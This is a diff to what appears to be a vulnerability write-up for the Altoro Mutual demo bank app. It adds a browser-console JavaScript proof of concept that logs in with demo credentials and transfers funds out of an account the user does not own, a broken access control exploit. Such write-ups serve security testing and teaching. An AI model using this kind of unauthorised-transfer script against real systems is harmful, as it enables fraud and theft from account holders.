@@ -561,6 +561,35 @@ In `index.jsp`, content is served from the `static/` directory using user provid
 
 - Run the following script in your browser's dev tools' console while on the website (F12 > console), and observe how funds get sent from 800000 to 800004 although 800000 does not belong to the sending user:
 
+  ```javascript
+  username = 'jdoe';
+  password = 'demo1234';
+  res = await (
+    await fetch('/altoromutual/api/login', {
+      headers: { 'Content-Type': 'application/json' },
+      method: 'POST',
+      body: JSON.stringify({
+        username,
+        password
+      })
+    })
+  ).json();
+
+  auth = res.Authorization;
+
+  res = await (
+    await fetch('/altoromutual/api/transfer', {
+      headers: { 'Content-Type': 'application/json', Authorization: auth },
+      method: 'POST',
+      body: JSON.stringify({
+        fromAccount: '800000',
+        toAccount: '800004',
+        transferAmount: '2000000'
+      })
+    })
+  ).json();
+  ```
+
 ![Transferring money from a foreign account](images/image-23.png)
 
 - Confirm the new balances as in the previous vulnerability
